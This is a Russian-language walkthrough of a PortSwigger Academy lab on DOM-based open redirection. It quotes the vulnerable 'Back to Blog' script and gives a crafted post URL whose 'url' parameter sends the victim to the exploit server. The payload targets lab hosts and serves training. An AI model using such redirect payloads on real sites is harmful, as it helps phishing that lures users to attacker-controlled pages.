Зайдем на уязвимый ресурс 

Перейдем на любой рандомный пост и исследуем страницу

нажмем `ПКМ` -> `inspect`

и увидим следующий скрипт, который возвращает нас на предыдущую страницу
```
<div class="is-linkback">
     <a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>
</div>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/4.%20DOM-based%20open%20redirection/pics%20for%20walkthrough/1.png)

Параметр url содержит уязвимость open redirect, которая позволяет вам изменить направление, по которому пользователь переходит по ссылке 
`Back to blog`


Перейдем в Exploit server и введем в Body следующий конфиг
```
https://0a45001604ee9e5a81cdcf4d00d400af.web-security-academy.net/post?postId=1&url=https://exploit-0a1500ee040e9e8381e2ce7b015500b0.exploit-server.net/
```
Нажмем `Store` -> `Deliver exploit to victim` и получим уведомление об успешно выполенной лабораторной работе
